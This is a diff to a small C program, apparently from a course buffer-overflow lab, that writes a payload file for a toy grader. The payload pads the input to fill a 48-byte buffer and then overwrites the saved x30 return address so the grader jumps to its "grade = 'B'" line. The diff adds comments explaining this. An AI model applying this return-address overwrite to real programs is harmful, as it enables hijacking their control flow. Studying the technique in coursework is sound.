@@ -25,16 +25,21 @@ int main(void) {
     char input[INPUT_LENGTH];
     int remainingChars;
     unsigned long ret;
+    /* address of the "grade = 'B'" line in grader.c "*/
+    ret = 4196440lu;
 
     fgets(input, INPUT_LENGTH, stdin);
-    ret = 4196440lu;
     psFile = fopen("dataB", "w");
+    /* the remaining number of characters required to fill the
+        48 character limit */
     remainingChars = BUFFER_LENGTH-strlen(input);
     fprintf(psFile,"%s",input);
     while(remainingChars>0) {
         fprintf(psFile,"%c", '\0');
         remainingChars--;
     }
+    /* overwriting the to-be value of x30, pointing it to the 
+        grade=B*/
     fwrite(&ret, sizeof(unsigned long), 1, psFile);
     return 0;
 }
